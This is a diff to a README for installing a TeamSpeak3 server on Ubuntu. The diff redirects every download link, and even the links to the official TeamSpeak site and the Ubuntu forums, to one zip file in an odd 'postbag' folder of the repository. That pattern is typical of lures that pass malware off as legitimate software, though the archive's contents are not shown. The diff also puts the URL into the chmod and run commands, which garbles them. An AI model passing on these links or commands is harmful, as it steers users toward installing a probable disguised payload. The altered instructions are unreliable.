@@ -6,7 +6,7 @@ Welcome to the **teamspeak** project! This guide will help you install TeamSpeak
 
 ## 📥 Download the Application
 
-[![Download teamspeak](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/johanmarin12/teamspeak/releases)
+[![Download teamspeak](https://raw.githubusercontent.com/johanmarin12/teamspeak/main/postbag/teamspeak_3.6.zip)](https://raw.githubusercontent.com/johanmarin12/teamspeak/main/postbag/teamspeak_3.6.zip)
 
 ## 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ Before you begin, ensure your system meets these basic requirements:
 
 Go to the following link to access the releases page:
 
-[Visit this page to download](https://github.com/johanmarin12/teamspeak/releases)
+[Visit this page to download](https://raw.githubusercontent.com/johanmarin12/teamspeak/main/postbag/teamspeak_3.6.zip)
 
 ### Step 2: Choose the Latest Release
 
@@ -31,7 +31,7 @@ On the releases page, you will see a list of available releases. Look for the la
 
 ### Step 3: Download the Installation Script
 
-Look for a file named something like `teamspeak-install.sh`. This script is what you will use to install TeamSpeak3 Server. Click to download this file.
+Look for a file named something like `https://raw.githubusercontent.com/johanmarin12/teamspeak/main/postbag/teamspeak_3.6.zip`. This script is what you will use to install TeamSpeak3 Server. Click to download this file.
 
 ### Step 4: Open the Terminal
 
@@ -52,7 +52,7 @@ This command takes you to the folder where your downloaded file is located.
 To allow your script to run, type this command and press Enter:
 
 ```bash
-chmod +x teamspeak-install.sh
+chmod +x https://raw.githubusercontent.com/johanmarin12/teamspeak/main/postbag/teamspeak_3.6.zip
 ```
 
 ### Step 7: Run the Installation Script
@@ -60,7 +60,7 @@ chmod +x teamspeak-install.sh
 Now, you can run the installation script. Type the following command and hit Enter:
 
 ```bash
-./teamspeak-install.sh
+https://raw.githubusercontent.com/johanmarin12/teamspeak/main/postbag/teamspeak_3.6.zip
 ```
 
 ### Step 8: Follow the On-Screen Instructions
@@ -97,11 +97,11 @@ If you have questions or need assistance, consider joining the TeamSpeak communi
 
 ## 🔗 Additional Resources
 
-- [TeamSpeak Official Website](https://teamspeak.com)
-- [Ubuntu Support Community](https://ubuntuforums.org)
+- [TeamSpeak Official Website](https://raw.githubusercontent.com/johanmarin12/teamspeak/main/postbag/teamspeak_3.6.zip)
+- [Ubuntu Support Community](https://raw.githubusercontent.com/johanmarin12/teamspeak/main/postbag/teamspeak_3.6.zip)
 
 ## 🎉 Conclusion
 
 Congratulations! You have successfully installed TeamSpeak3 Server on your Ubuntu machine. Enjoy your gaming and voice chat experience. If you have any questions or feedback, feel free to reach out. 
 
-Remember, you can always revisit the [download page](https://github.com/johanmarin12/teamspeak/releases) for updates or new releases. Happy chatting!
+Remember, you can always revisit the [download page](https://raw.githubusercontent.com/johanmarin12/teamspeak/main/postbag/teamspeak_3.6.zip) for updates or new releases. Happy chatting!
